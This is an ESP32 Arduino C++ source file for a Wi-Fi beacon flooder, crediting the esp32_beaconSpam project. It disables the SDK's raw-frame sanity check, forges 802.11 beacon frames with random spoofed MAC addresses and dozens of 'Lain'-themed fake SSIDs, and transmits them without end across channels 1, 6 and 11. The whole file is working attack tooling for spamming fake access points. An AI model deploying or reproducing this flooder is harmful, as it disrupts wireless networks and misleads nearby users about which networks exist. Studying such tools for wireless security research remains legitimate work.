#include <WiFi.h>
#include <esp_wifi.h>
#include "ssids.h"
#include "boot_button_pressed.h"
#include "definitions.h"

#define DEBUG_PKGS_SENT

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

void printHex(const uint8_t* data, size_t len) {
  for (size_t i = 0; i < len; i++) {
    if (i > 0 && i % 16 == 0) {
      DEBUG_PRINTLN();  // 每16字节换行
    }
    DEBUG_PRINTF("%02x ", data[i]);  // 打印两位十六进制，带空格分隔
  }
  DEBUG_PRINTLN();
}

void beaconFlood() {
  // Source code from https://github.com/Tnze/esp32_beaconSpam
  // Implementation with https://github.com/74lg0
  // ===== Settings ===== //
  const uint8_t channels[] = {1, 6, 11}; // used Wi-Fi channels (available: 1-14)
  const bool wpa2 = false; // WPA2 networks
  const bool appendSpaces = false; // makes all SSIDs 32 characters long
  uint32_t pkgsPerSSID = 3;
  uint32_t delayMillis = 1;
  uint32_t pkgsRateMs = 10;

  #ifndef SSIDS_H
  // SSID list
  const char* ssids[] = {
    "Lain-is-here",
    "I-Am-Lain",
    "Lain-Connected",
    "Lain-In-The-Wired",
    "The-Lain-Effect",
    "Lain-Protocol",
    "Lain-Watching",
    "Lain-Dreams",
    "Lain-Is-Always-There",
    "Lain-Can-See-You",
    "Lain-Routers",
    "I-See-You-Lain",
    "Lain-Network",
    "I-Am-The-Lain",
    "Lain-Wired-Heart",
    "Lain-Feed-Back",
    "She-Is-Lain",
    "The-Wired-Is-Lain",
    "Lain-Feeds-You",
    "Lain-Hacking-Now",
    "I-Am-The-Lain-Network",
    "Lain-Sleep-Wait",
    "Lain-Tunnels",
    "Lain-Is-Watching-You",
    "You-Are-Lain",
    "Lain-Router-Alive",
    "Lain-Subspace",
    "Lain-Sleepy-Lain",
    "You-See-Lain",
    "Lain-Touched-You",
    "Lain-Surveillance",
    "Lain-Sleep-Mode",
    "Welcome-To-The-Wired-Lain",
    "Lain-Existance",
    "Lain-Is-Real",
    "Reality-Is-Lain",
    "Lain-Everywhere",
    "Lain-Protocol-X",
    "Lain-Node-Ready",
    "Lain-Signals",
    "Lain-Dream-State",
    "The-Wired-Lain",
    "Lain-Silent-Wired",
    "I-Am-Your-Lain",
    "Lain-Connects-You",
    "Lain-Is-The-Wired",
    "Lain-Can-Hack-You",
    "Lain-Digital-Dream"
  };
  #endif
  const int ssidCount = sizeof(ssids) / sizeof(ssids[0]);

  // Beacon frame definition
  uint8_t beaconPacket[109] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0xA0, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
    /* 16 - 21 */ 0xA0, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

    // Fixed parameters
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
    /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation

    // Tagged parameters
    // SSID parameters
    /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID

    // Supported Rates
    /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
    /* 72 */ 0x82, // 1(B)
    /* 73 */ 0x84, // 2(B)
    /* 74 */ 0x8b, // 5.5(B)
    /* 75 */ 0x96, // 11(B)
    /* 76 */ 0x24, // 18
    /* 77 */ 0x30, // 24
    /* 78 */ 0x48, // 36
    /* 79 */ 0x6c, // 54

    // Current Channel
    /* 80 - 81 */ 0x03, 0x01, // Channel set, length
    /* 82 */      0x01,       // Current Channel

    // RSN information
    /*  83 -  84 */ 0x30, 0x18,
    /*  85 -  86 */ 0x01, 0x00,
    /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
    /*  91 -  92 */ 0x02, 0x00,
    /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /* 101 - 102 */ 0x01, 0x00,
    /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
    /* 107 - 108 */ 0x00, 0x00
  };

  // Static variables to maintain state between calls
  static char emptySSID[32];
  static uint8_t channelIndex = 0;
  static uint8_t macAddr[6];
  static uint8_t wifi_channel = 1;
  static uint32_t packetCounter = 0;
  static uint32_t packetRateTime = 0;
  static uint32_t packetSize = wpa2 ? sizeof(beaconPacket) : (sizeof(beaconPacket) - 26);
  static bool initialized = false;
  static int ssidIndex = 0;

  // Initialization (runs once)
  if (!initialized) {
    // Create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    
    // Generate random MAC
    for (int i = 1; i < 6; i++) macAddr[i] = random(256);
    
    // WiFi setup
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
    
    // Adjust packet for WPA
    if (!wpa2) beaconPacket[34] = 0x21;

    initialized = true;
  }
  while (true)
  {
    // Main function logic (runs continuously)
    uint32_t currentTime = millis();

    // Channel hopping
    if (sizeof(channels) > 1) {
      uint8_t ch = channels[channelIndex];
      channelIndex = (channelIndex + 1) % (sizeof(channels)/sizeof(channels[0]));
      
      if (ch != wifi_channel && ch >= 1 && ch <= 14) {
        wifi_channel = ch;
        esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
      }
    }

    // Get current SSID
    const char* currentSSID = ssids[ssidIndex];
    ssidIndex = (ssidIndex + 1) % ssidCount;
    int ssidLen = strlen(currentSSID);
    
    // Update MAC (last byte changes for diversity)
    macAddr[5] = random(256);
    memcpy(&beaconPacket[10], macAddr, 6);
    memcpy(&beaconPacket[16], macAddr, 6);
    
    // Clear and set SSID
    memcpy(&beaconPacket[38], emptySSID, 32);
    memcpy(&beaconPacket[38], currentSSID, ssidLen);
    
    // Set current channel
    beaconPacket[82] = wifi_channel;
    
    // Send packet
    if (appendSpaces) {
      uint16_t tmpPacketSize = packetSize - (wpa2 ? 0 : 26);
      uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
      memcpy(&tmpPacket[0], &beaconPacket[0], tmpPacketSize);
      for (int k = 0; k < pkgsPerSSID; k++) {
        packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, 0) == 0;
        delay(delayMillis);
      }
      #ifdef DEBUG_PKGS_SENT
      if(isBootButtonPressed_interrupt()) {
        packetRateTime = currentTime;
        DEBUG_PRINTLN("Packets sent since last query:");
        DEBUG_PRINTLN(packetCounter);
        packetCounter = 0;
        DEBUG_PRINTLN("Last Pkg Struc Hex: ");
        printHex(tmpPacket, tmpPacketSize);
      }
      #endif
      delete[] tmpPacket;
    } else {
      uint16_t tmpPacketSize = 109 - 32 + (ssidLen) - (wpa2 ? 0 : 26);
      uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
      memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen+1);
      tmpPacket[37] = ssidLen;
      memcpy(&tmpPacket[38 + (ssidLen)], &beaconPacket[70], wpa2 ? 39 : 39-26);
      
      for (int k = 0; k < pkgsPerSSID; k++) {
        packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, 0) == 0;
        delay(delayMillis);
      }
      #ifdef DEBUG_PKGS_SENT
      if(isBootButtonPressed_interrupt()) {
        packetRateTime = currentTime;
        DEBUG_PRINTLN("Packets sent since last query:");
        DEBUG_PRINTLN(packetCounter);
        packetCounter = 0;
        DEBUG_PRINTLN("Last Pkg Struc Hex: ");
        printHex(tmpPacket, tmpPacketSize);
      }
      #endif
      delete[] tmpPacket;
    }
    delay(pkgsRateMs);
  }
}
